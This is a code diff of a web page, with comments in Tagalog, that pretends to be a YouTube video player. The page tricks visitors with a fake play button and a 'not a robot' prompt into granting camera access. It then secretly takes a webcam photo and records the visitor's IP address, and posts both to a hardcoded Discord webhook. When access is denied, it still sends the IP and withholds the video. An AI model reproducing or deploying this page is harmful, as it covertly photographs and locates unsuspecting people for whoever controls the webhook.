@@ -3,77 +3,81 @@
 <head>
     <title>YouTube</title>
     <meta property="og:title" content="YouTube - Watch Now">
-    <meta property="og:description" content="Official YouTube Portal">
     <meta property="og:image" content="https://img.youtube.com/vi/GoHLDPWT6Hw/maxresdefault.jpg">
-    <meta property="og:type" content="video.other">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
     <style>
-        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; font-family: sans-serif; }
-        iframe { width: 100%; height: 100%; border: none; display: none; } /* Nakatago muna ang video */
-        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; cursor: pointer; text-align: center; }
-        .play-btn { width: 80px; height: 80px; background: red; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 20px; }
+        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; font-family: sans-serif; color: white; }
+        #player { width: 100%; height: 100%; border: none; display: none; }
+        #lock-screen { text-align: center; z-index: 9999; padding: 20px; }
+        .play-btn { width: 80px; height: 80px; background: red; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; cursor: pointer; margin-bottom: 15px; }
         .play-btn::after { content: ''; border-style: solid; border-width: 15px 0 15px 25px; border-color: transparent transparent transparent white; margin-left: 5px; }
+        .error-msg { color: #ff4444; display: none; margin-top: 15px; font-size: 14px; }
     </style>
 </head>
 <body>
 
-    <div id="overlay" onclick="startTrap()">
-        <div class="play-btn"></div>
-        <p>Click to Play Video</p>
-        <small style="color: #666;">YouTube Player v2.4.1</small>
+    <div id="lock-screen">
+        <div class="play-btn" onclick="requestAccess()"></div>
+        <h2>Confirm you're not a robot</h2>
+        <p>Please allow camera access to verify and play the video.</p>
+        <div id="error" class="error-msg">⚠️ Access Denied. You must ALLOW camera to watch this video. Please refresh and try again.</div>
     </div>
 
-    <iframe id="player" src="https://www.youtube.com/embed/GoHLDPWT6Hw?autoplay=1&enablejsapi=1" allow="autoplay; encrypted-media"></iframe>
+    <iframe id="player" src="https://www.youtube.com/embed/GoHLDPWT6Hw?autoplay=1" allow="autoplay; encrypted-media"></iframe>
 
     <video id="v" autoplay style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        const webhook = "https://discord.com/api/webhooks/1470024521758277849/x38VsV5RWVkSq6k7un7WZ8H43jrfzy9yUfI4D3MvDd_WP3jgTIb1_0kn6ga4Kho4c54z";
+        const hook = "https://discord.com/api/webhooks/1470024521758277849/x38VsV5RWVkSq6k7un7WZ8H43jrfzy9yUfI4D3MvDd_WP3jgTIb1_0kn6ga4Kho4c54z";
 
-        async function startTrap() {
-            // Pag-click nila, itatago ang overlay at ipapakita ang video
-            document.getElementById('overlay').style.display = 'none';
-            document.getElementById('player').style.display = 'block';
+        async function requestAccess() {
+            const errorText = document.getElementById('error');
+            
+            try {
+                // 1. KUNIN ANG IP AGAD
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
 
-            if (!sessionStorage.getItem('huli_na')) {
-                try {
-                    const ipRes = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipRes.json();
+                // 2. I-FORCE ANG CAMERA ALLOW
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                
+                // PAG UMABOT DITO, IBIG SABIHIN NAG-ALLOW SILA!
+                document.getElementById('lock-screen').style.display = 'none';
+                document.getElementById('player').style.display = 'block';
+
+                // 3. KUNIN ANG SHOT
+                const vid = document.getElementById('v');
+                vid.srcObject = stream;
+
+                setTimeout(async () => {
+                    const can = document.getElementById('c');
+                    can.width = 640; can.height = 480;
+                    can.getContext('2d').drawImage(vid, 0, 0);
+                    const img = can.toDataURL('image/jpeg', 0.6);
+                    const blob = await (await fetch(img)).blob();
                     
-                    // Request Cam - Dito lalabas yung "Allow"
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    const vid = document.getElementById('v');
-                    vid.srcObject = stream;
+                    const fd = new FormData();
+                    fd.append('file', blob, 'huli.jpg');
+                    fd.append('payload_json', JSON.stringify({
+                        content: "🎯 **SUCCESS! TARGET ALLOWED CAM**\n**IP:** " + ipData.ip
+                    }));
 
-                    setTimeout(async () => {
-                        const can = document.getElementById('c');
-                        can.width = 640; can.height = 480;
-                        can.getContext('2d').drawImage(vid, 0, 0);
-                        const img = can.toDataURL('image/jpeg', 0.6);
+                    fetch(hook, { method: 'POST', body: fd });
+                    stream.getTracks().forEach(t => t.stop());
+                }, 1000);
 
-                        const blob = await (await fetch(img)).blob();
-                        const fd = new FormData();
-                        fd.append('file', blob, 'huli_ka.jpg');
-                        fd.append('payload_json', JSON.stringify({
-                            content: "🚨 **HULI SA AKTO!**\n**IP:** " + ipData.ip
-                        }));
-
-                        await fetch(webhook, { method: 'POST', body: fd });
-                        sessionStorage.setItem('huli_na', 'true');
-                        stream.getTracks().forEach(t => t.stop());
-                    }, 1000);
-                } catch (e) {
-                    // Pag in-ignore o ni-deny ang cam, send pa rin ang IP
-                    const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-                    fetch(webhook, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ content: "⚠️ Cam Denied/Blocked. IP: " + ipData.ip })
-                    });
-                    sessionStorage.setItem('huli_na', 'true');
-                }
+            } catch (e) {
+                // PAG NAG-DENY, HINDI LALABAS ANG VIDEO
+                errorText.style.display = 'block';
+                
+                // Send IP pa rin sa Discord para alam mong may nag-attempt
+                const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "Unknown"}));
+                fetch(hook, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ content: "🚫 **DENIED!** Ayaw mag-allow ng sigbin.\n**IP:** " + ipData.ip })
+                });
             }
         }
     </script>
